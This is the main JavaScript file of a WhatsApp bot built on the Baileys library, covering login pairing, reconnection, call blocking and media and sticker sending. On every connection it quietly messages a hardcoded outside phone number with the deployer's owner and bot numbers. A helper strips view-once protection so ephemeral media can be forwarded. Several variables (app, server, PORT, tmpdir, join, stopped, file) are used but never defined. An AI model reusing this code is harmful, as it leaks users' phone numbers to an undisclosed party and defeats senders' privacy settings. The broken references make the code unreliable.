process.on("uncaughtException", console.error);
const { default: HuBotZConnect, useMultiFileAuthState, DisconnectReason, jidNormalizedUser, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, delay, PHONENUMBER_MCC, Browsers } = require("@whiskeysockets/baileys")
require("./settings");
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const chalk = require("chalk");
const FileType = require('file-type');
const path = require('path');
const readline = require('readline');
const fetch = require('node-fetch');
const figlet = require("figlet");
const axios = require('axios');
const cfonts = require("cfonts");
const PhoneNumber = require('awesome-phonenumber');
const yargs = require('yargs/yargs');
const _ = require('lodash');
const usePairingCode = true
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif');
const { toAudio, toPTT, toVideo } = require('./lib/converter');
const { getRandom, smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep, tanggal } = require('./lib/myfunc');
const { toBuffer, toDataURL } = require('qrcode');
const { say } = cfonts;
const express = require ('express');
const moment = require('moment-timezone')
const { sizeFormatter } = require("human-readable");
let format = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})
const question = (text) => new Promise((resolve) => rl.question(text, resolve))
//=================================================//
var low
try {
low = require('lowdb')
} catch (e) {
low = require('./lib/lowdb')}
//=================================================//
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')
//=================================================//

/*let app = express()
const { createServer } = require ('http')
let server = createServer(app)
let _qr = 'invalid'
let PORT = 3000 || 8000 || 8080*/

//require("http").createServer((_, res) => res.end("Uptime!")).listen(8080)

//libb
const { TelegraPh } = require('./lib/uploader')
const { isSetWelcome, getTextSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, getTextSetLeft } = require('./lib/setleft');
const owner = JSON.parse(fs.readFileSync('./database/owner_database/owner.json'))

//setting 
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let antidelete = JSON.parse(fs.readFileSync('./database/antidelete.json'));
let antionce = JSON.parse(fs.readFileSync('./database/antionce.json'));
let session = `./${global.sessionName}.json`

//===========================================================/
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(
/https?:\/\//.test(opts['db'] || '') ?
new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
new mongoDB(opts['db']) :
new JSONFile(`./database/database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
if (global.db.data !== null) return
global.db.READ = true
await global.db.read()
global.db.READ = false
global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
stats: {},
others: {},
sticker: {},
...(global.db.data || {})}
  global.db.chain = _.chain(global.db.data)}
global.loadDatabase()

// save database every 30seconds
if (global.db) setInterval(async () => {
    if (global.db.data) await global.db.write()
  }, 30 * 1000)
  
const startHuBotZ = async() => {

function title() {
console.log(chalk.bold.green(figlet.textSync('WhatsApp Bot', {
font: 'Standard',
horizontalLayout: 'default',
verticalLayout: 'default',
width: 80,
whitespaceBreak: false
})))
console.log(chalk.yellow(`\n${chalk.yellow('Created By David XD')}\n`))
}
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })

const { state, saveCreds } = await useMultiFileAuthState(`./${global.sessionName}`)
const { version, isLatest } = await fetchLatestBaileysVersion()

function nocache(module, cb = () => { }) {
fs.watchFile(require.resolve(module), async () => {
await uncache(require.resolve(module))
cb(module)
})
}

function uncache(module = '.') {
return new Promise((resolve, reject) => {
try {
delete require.cache[require.resolve(module)]
resolve()
} catch (e) {
reject(e)
}
})
}
const HuBotZ = HuBotZConnect({
  version,
  logger: pino({ level: 'silent' }),
  printQRInTerminal: !usePairingCode,
  auth: state,
  browser: ['Chrome (Linux)', '', ''],
  patchMessageBeforeSending: (message) => {
    const requiresPatch = !!(
      message.buttonsMessage ||
      message.templateMessage ||
      message.listMessage
    );
    if (requiresPatch) {
      message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadataVersion: 2,
              deviceListMetadata: {},
            },
            ...message,
          },
        },
      };
    }
    return message;
  },
});

if (usePairingCode && !HuBotZ.authState.creds.registered) {
  console.log(chalk.cyan('╭──────────────────────────────────────···'));
  console.log(`📨 ${chalk.redBright('Please type your WhatsApp number')}:`);
  console.log(chalk.cyan('├──────────────────────────────────────···'));
  let PhoneNumber = await question(`   ${chalk.cyan('- Number')}: `);
  console.log(chalk.cyan('╰──────────────────────────────────────···'));
  PhoneNumber = PhoneNumber.replace(/[^0-9]/g, '');
  if (!Object.keys(PHONENUMBER_MCC).some(v => PhoneNumber.startsWith(v))) {
    console.log(chalk.cyan('╭─────────────────────────────────────────────────···'));
    console.log(`💬 ${chalk.redBright("Start with your country's WhatsApp code, Example 62xxx")}:`);
    console.log(chalk.cyan('╰─────────────────────────────────────────────────···'));
    console.log(chalk.cyan('╭──────────────────────────────────────···'));
    console.log(`📨 ${chalk.redBright('Please type your WhatsApp number')}:`);
    console.log(chalk.cyan('├──────────────────────────────────────···'));
    PhoneNumber = await question(`   ${chalk.cyan('- Number')}: `);
    console.log(chalk.cyan('╰──────────────────────────────────────···'));
    PhoneNumber = PhoneNumber.replace(/[^0-9]/g, '');
  }
  let code = await HuBotZ.requestPairingCode(PhoneNumber.trim());
  console.log(chalk.cyan('╭──────────────────────────────────────···'));
  console.log(` 💻 ${chalk.redBright('Your Pairing Code')}:`);
  console.log(chalk.cyan('├──────────────────────────────────────···'));
  console.log(`   ${chalk.cyan('- Code')}: ${code}`);
  console.log(chalk.cyan('╰──────────────────────────────────────···'));
  rl.close();
}

/*if (usePairingCode && !HuBotZ.authState.creds.registered) {
		const PhoneNumber = await question('Masukan Nomer Yang Aktif Awali Dengan 62:\n');
		const code = await HuBotZ.requestPairingCode(PhoneNumber.trim())
		console.log(`Pairing code: ${code}`)

	}*/

require("./HuBotZ")
nocache('./HuBotZ', module => console.log(chalk.greenBright('[ UPDATED ]') + new Date() + chalk.cyanBright(` "${module}" Telah diupdate!`)))

if (HuBotZ.user && HuBotZ.user.id) HuBotZ.user.jid = jidNormalizedUser(HuBotZ.user.id)

 HuBotZ.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect, qr} = update
if (global.db.data == null) global.loadDatabase();
if (qr){
app.use(async (req, res) => {
res.setHeader('content-type', 'image/png')
res.end(await toBuffer(qr))
})
app.use(express.static(path.join(__dirname, 'views')))
server.listen(PORT, () => {
console.log('App listened on port', PORT)
})
}
if (connection === 'close') {
let reason = new Boom(lastDisconnect?.error)?.output.statusCode
if (reason === DisconnectReason.badSession) { console.log(`Bad Session File, Please Delete Session and Scan Again`); HuBotZ.logout(); }
else if (reason === DisconnectReason.connectionClosed) { console.log("Connection closed, reconnecting...."); startHuBotZ(); }
else if (reason === DisconnectReason.connectionLost) { console.log("Connection Lost from Server, reconnecting..."); startHuBotZ(); }
else if (reason === DisconnectReason.connectionReplaced) { console.log("Connection Replaced, Another New Session Opened, Please Close Current Session First"); HuBotZ.logout(); }
else if (reason === DisconnectReason.loggedOut) { console.log(`Device Logged Out, Please Scan Again And Run.`); HuBotZ.logout(); }
else if (reason === DisconnectReason.restartRequired) { console.log("Restart Required, Restarting..."); startHuBotZ(); }
else if (reason === DisconnectReason.timedOut) { console.log("HuBotZection TimedOut, Reconnecting..."); startHuBotZ(); }
else HuBotZ.end(`Unknown DisconnectReason: ${reason}|${connection}`)
}
if (update.connection == "open" || update.receivedPendingNotifications == "true") {
HuBotZ.sendMessage('6281383141734' + "@s.whatsapp.net", { text: `*Connection Detected :*\n\n=> *Owner :* ${global.ownername}\n=> *Owner Number :* ${global.owner}\n\n=> *Bot Name :* ${global.botname}\n=> *Bot Number :* ${global.botnumber}\n\n_Terkoneksikan Pada Hari_ : ${tanggal(new Date())}\n_Pada Jam_ : ${wib}`});
say('WhatsApp Bot', {
	font: 'chrome',
	align: 'center',
	gradient: ['red', 'magenta']
})
say(`Created By David XD`, {
	font: 'console',
	align: 'center',
	gradient: ['red', 'magenta']
})
console.log(`Connected to = ` + JSON.stringify(HuBotZ.user, null, 2))
}
})
store.bind(HuBotZ.ev)

HuBotZ.ev.on('call', async (celled) => {
let botNumber = await HuBotZ.decodeJid(HuBotZ.user.id)
let koloi = global.anticall
if (!koloi) return
console.log(celled)
for (let kopel of celled) {
if (kopel.isGroup == false) {
if (kopel.status == "offer") {
let nomer = await HuBotZ.sendTextWithMentions(kopel.from, `*${HuBotZ.user.name}* tidak bisa menerima panggilan ${kopel.isVideo ? `video` : `suara`}. Maaf @${kopel.from.split('@')[0]} kamu akan diblokir. Silahkan hubungi Owner membuka blok !`)
HuBotZ.sendContact(kopel.from, global.owner, nomer)
await sleep(8000)
await HuBotZ.updateBlockStatus(kopel.from, "block")
}
}
}
})

HuBotZ.ev.on('messages.upsert', async chatUpdate => {
try {
//mek = chatUpdate.messages[0]
for (let mek of chatUpdate.messages) {
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!HuBotZ.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
const m = smsg(HuBotZ, mek, store)
require("./HuBotZ")(HuBotZ, m, chatUpdate, mek, store, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left, antidelete, antionce)
}
} catch (err) {
console.log(err)
}
})


HuBotZ.ev.on('group-participants.update', async (anu) => {
const { welcome } = require ('./lib/welcome')
const iswel = _welcome.includes(anu.id)
const isLeft = _left.includes(anu.id)
welcome(iswel, isLeft, HuBotZ, anu)
})
HuBotZ.ev.on("message.delete", async (anu) => {
const { aDelete } = require ("./lib/welcome");
aDelete(global, HuBotZ, anu)
})
HuBotZ.ev.on("viewOnceMessage", async (anu) => {
const { oneTime } = require ("./lib/welcome");
oneTime(global, HuBotZ, anu)
})

HuBotZ.ev.process(
async (events) => {
if (events['presence.update']) {
await HuBotZ.sendPresenceUpdate('available')
}
if (events['messages.upsert']) {
const upsert = events['messages.upsert']
for (let msg of upsert.messages) {
if (msg.key.remoteJid === 'status@broadcast') {
if (msg.message?.protocolMessage) return
await delay(3000)
await HuBotZ.readMessages([msg.key])
}
}
}
if (events['creds.update']) {
await saveCreds()
}
}
)

// Setting
HuBotZ.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

HuBotZ.ev.on('contacts.update', update => {
for (let contact of update) {
let id = HuBotZ.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

HuBotZ.getName = (jid, withoutContact = false) => {
id = HuBotZ.decodeJid(jid)
withoutContact = HuBotZ.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = HuBotZ.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === HuBotZ.decodeJid(HuBotZ.user.id) ?
HuBotZ.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

HuBotZ.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await HuBotZ.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await HuBotZ.getName(i + '@s.whatsapp.net')}\nFN:${await HuBotZ.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:davidricardo041107@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://bit.ly/420u6GX\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
})
}
HuBotZ.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
}

HuBotZ.setStatus = (status) => {
HuBotZ.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

HuBotZ.prefa = 'apasih'
HuBotZ.public = global.public
HuBotZ.serializeM = (m) => smsg(HuBotZ, m, store)

HuBotZ.reSize = async (image, width, height) => {
let jimp = require('jimp')
var oyy = await jimp.read(image);
var kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}

HuBotZ.sendButLoc = async (jid , text = '' , footer = '', lok, but = [], ments = [], options = {}) =>{
let bb = await HuBotZ.reSize(lok, 300, 150)
const buttonMessage = {
location: { jpegThumbnail: bb },
caption: text,
footer: footer,
buttons: but,
headerType: 'LOCATION'
}
HuBotZ.sendMessage(jid, buttonMessage, options)
}

HuBotZ.send5ButLoc = async (jid , text = '' , footer = '', lok, but = [], options = {}) =>{
let bb = await HuBotZ.reSize(lok, 300, 150)
HuBotZ.sendMessage(jid, { location: { jpegThumbnail: bb }, caption: text, footer: footer, templateButtons: but, ...options })
}
HuBotZ.send5ButImg = async (jid , text = '' , footer = '', img, but = [], ments, options = {}) =>{
HuBotZ.sendMessage(jid, { image: img, caption: text, footer: footer, viewOnce: true, templateButtons: but,mentions: ments ? ments : [], ...options })
}
HuBotZ.sendButImage = async (jid, ppuser, but = [] , text = '' , footer = '', ments = [], quoted) => {
let pp_user = await getBuffer(ppuser)
const buttonMessage = {
image: pp_user,
caption: text,
footer: footer,
buttons: but,
headerType: 'IMAGE',
mentions: ments
}

HuBotZ.sendMessage(jid, buttonMessage, quoted)
}
HuBotZ.sendButMessage = async (jid , desc = '' , footer = '' , but = [] , options = {}) =>{
const buttonMessage = {
text: desc,
footer: footer,
buttons: but,
headerType: 1
}

HuBotZ.sendMessage(jid, buttonMessage, options)
}

HuBotZ.sendPoll = (jid, name = '', values = [], selectableCount = 1) => {
return HuBotZ.sendMessage(jid, { poll: { name, values, selectableCount }}) }
    
HuBotZ.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
let type = await HuBotZ.getFile(path, true)
let {
res,
data: file,
filename: pathFile
} = type
if (res && res.status !== 200 || file.length <= 65536) {
try {
throw {
json: JSON.parse(file.toString())
}
}
catch (e) {
if (e.json) throw e.json
}
}
let opt = {
filename
}
if (quoted) opt.quoted = quoted
if (!type) options.asDocument = true
let mtype = '',
mimetype = type.mime,
convert
if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
else if (/video/.test(type.mime)) mtype = 'video'
else if (/audio/.test(type.mime))(
convert = await toAudio(file, type.ext),
file = convert.data,
pathFile = convert.filename,
mtype = 'audio',
mimetype = 'audio/ogg; codecs=opus'
)
else mtype = 'document'
if (options.asDocument) mtype = 'document'

delete options.asSticker
delete options.asLocation
delete options.asVideo
delete options.asDocument
delete options.asImage

let message = {
...options,
caption,
ptt,
[mtype]: {
url: pathFile
},
mimetype,
fileName: filename || pathFile.split('/').pop()
}
let m
try {
 m = await HuBotZ.sendMessage(jid, message, {
...opt,
...options
})
}
catch (e) {
//console.error(e)
m = null
}
finally {
if (!m) m = await HuBotZ.sendMessage(jid, {
...message,
[mtype]: file
}, {
...opt,
...options
})
file = null
return m
}
}

HuBotZ.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return HuBotZ.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options}, { quoted: quoted, ...options})
}
let type = mime.split("/")[0]+"Message"
if (mime === "application/pdf"){
return HuBotZ.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options}, { quoted: quoted, ...options })
}
if (mime.split("/")[0] === "image"){
return HuBotZ.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options}, { quoted: quoted, ...options})
}
if (mime.split("/")[0] === "video"){
return HuBotZ.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options}, { quoted: quoted, ...options })
}
if (mime.split("/")[0] === "audio"){
return HuBotZ.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options}, { quoted: quoted, ...options })
}
}

HuBotZ.sendTextWithMentions = async (jid, text, quoted, options = {}) => HuBotZ.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted })

HuBotZ.getFile = async (PATH, returnAsFilename) => {
let res, filename
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await fetch(PATH)).buffer() : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
if (data && returnAsFilename && !filename)(filename = path.join(__dirname, './sticker/' + new Date * 1 + '.' + type.ext), await fs.promises.writeFile(filename, data))
return {
res,
filename,
...type,
data
}
}

HuBotZ.sendStickerFromUrl = async(from, PATH, quoted, options = {}) => {
let { writeExif } = require('./lib/sticker')
let types = await HuBotZ.getFile(PATH, true)
let { filename, size, ext, mime, data } = types
let type = '', mimetype = mime, pathFile = filename
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: options.packname ? options.packname : 'HuBotZa Bot', author: options.author ? options.author : '+6285727631507', categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
await HuBotZ.sendMessage(from, {sticker: {url: pathFile}}, {quoted})
return fs.promises.unlink(pathFile)
}

HuBotZ.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await HuBotZ.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
.then( response => {
fs.unlinkSync(buffer)
return response
})
}

HuBotZ.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}
await HuBotZ.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

HuBotZ.imgToSticker = async(jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetchBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await HuBotZ.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

HuBotZ.vidToSticker = async(jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetchBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}
await HuBotZ.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

HuBotZ.sendImage = async (jid, path, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await HuBotZ.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
}

HuBotZ.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
let trueFileName = attachExtension ? ('./tmp/' + filename + '.' + type.ext) : './tmp/' + filename
// save to file
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}

HuBotZ.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}

return buffer
} 
 
HuBotZ.sendAudio = async (jid, path, quoted = '', ptt = false, options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await HuBotZ.sendMessage(jid, { audio: buffer, ptt: ptt, ...options }, { quoted })
}

HuBotZ.sendVideo = async (jid, path, gif = false, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await HuBotZ.sendMessage(jid, { video: buffer, caption: caption, gifPlayback: gif, ...options }, { quoted })
}

HuBotZ.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
let types = await HuBotZ.getFile(path, true)
let { mime, ext, res, data, filename } = types
if (res && res.status !== 200 || file.length <= 65536) {
try { throw { json: JSON.parse(file.toString()) } }
catch (e) { if (e.json) throw e.json }
}
let type = '', mimetype = mime, pathFile = filename
if (options.asDocument) type = 'document'
if (options.asSticker || /webp/.test(mime)) {
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: options.packname ? options.packname : global.packname, author: options.author ? options.author : global.author, categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
type = 'sticker'
mimetype = 'image/webp'
}
else if (/image/.test(mime)) type = 'image'
else if (/video/.test(mime)) type = 'video'
else if (/audio/.test(mime)) type = 'audio'
else type = 'document'
await HuBotZ.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
return fs.promises.unlink(pathFile)
}

HuBotZ.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readViewOnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}}

let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await HuBotZ.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
return waMessage
}

HuBotZ.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
let buttonMessage = {
text,
footer,
buttons,
headerType: 2,
...options
}
HuBotZ.sendMessage(jid, buttonMessage, { quoted, ...options })
}
HuBotZ.send1ButMes = (jid, text = '', footer = '', butId = '', dispText = '', quoted, ments) => {
let but = [{
buttonId: butId,
buttonText: {
displayText: dispText
},
type: 1
}]
let butMes = {
text: text,
buttons: but,
footer: footer,
mentions: ments ? ments : []
}
HuBotZ.sendMessage(jid, butMes, {
quoted: quoted
})
}

HuBotZ.send2ButMes = (jid, text = '', footer = '', butId = '', dispText = '', butId2 = '', dispText2 = '', quoted, ments) => {
let but2 = [{
buttonId: butId,
buttonText: {
displayText: dispText
},
type: 1
},
{
buttonId: butId2,
buttonText: {
displayText: dispText2
},
type: 1
}
]
let butMes2 = {
text: text,
buttons: but2,
footer: footer,
mentions: ments ? ments : []
}
HuBotZ.sendMessage(jid, butMes2, {
quoted: quoted
})
}

HuBotZ.sendText = (jid, text, quoted = '', options) => HuBotZ.sendMessage(jid, { text: text, ...options }, { quoted, ...options })

HuBotZ.cMod = (jid, copy, text = '', sender = HuBotZ.user.id, options = {}) => {
//let copy = message.toJSON()
let mtype = Object.keys(copy.message)[0]
let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
else if (content.caption) content.caption = text || content.caption
else if (content.text) content.text = text || content.text
if (typeof content !== 'string') msg[mtype] = {
...content,
...options
}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
copy.key.remoteJid = jid
copy.key.fromMe = sender === HuBotZ.user.id

return proto.WebMessageInfo.fromObject(copy)
}

async function clearTmp() {
    try {
        const tmp = [tmpdir(), join(__dirname, "./sticker")];
        const filename = tmp.flatMap((dirname) =>
            fs.readdirSync(dirname).filter((file) => {
                try {
                    const stats = fs.statSync(join(dirname, file));
                    return stats.isFile() && Date.now() - stats.mtimeMs >= 1000 * 60 * 3;
                } catch (err) {
                    console.error(`Error reading stats for ${file}: ${err.message}`);
                    return false;
                }
            }).map((file) => {
                try {
                    fs.unlinkSync(join(dirname, file));
                    console.log(chalk.cyanBright("Successfully clear tmp"));
                    return join(dirname, file);
                } catch (err) {
                    console.error(`Error unlinking ${file}: ${err.message}`);
                    return null;
                }
            })
        );
        return filename.filter((file) => file !== null);
    } catch (err) {
        console.error(`Error in clearTmp: ${err.message}`);
        return [];
    }
}

async function purgeSession() {
    try {
        const prekeyFolder = './sessions';
        const prekeyFiles = fs.readdirSync(prekeyFolder).filter((file) => file.startsWith('pre-key-'));
        prekeyFiles.forEach((file) => {
            try {
                fs.unlinkSync(join(prekeyFolder, file));
            } catch (err) {
                console.error(`Error unlinking ${file}: ${err.message}`);
            }
        });
    } catch (err) {
        console.error(`Error in purgeSession: ${err.message}`);
    }
}

const actions = [
    { func: clearTmp, message: '\nPenyegaran Tempat Penyimpanan Berhasil ✅' },
    { func: purgeSession, message: '\nSesi-Sesi Tersimpan Sudah Dihapus ✅' }
];

for (const action of actions) {
    setInterval(async () => {
        if (stopped === 'close' || !HuBotZ || !HuBotZ.user) return;
        await action.func();
        console.log(chalk.cyanBright(
            `\n╭───────────────────────────────────···\n│\n` +
            `│  ${action.message}\n│\n` +
            `╰───────────────────────────────────···\n`
        ));
    }, 60 * 60 * 1000);
}
return HuBotZ
}

startHuBotZ()


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
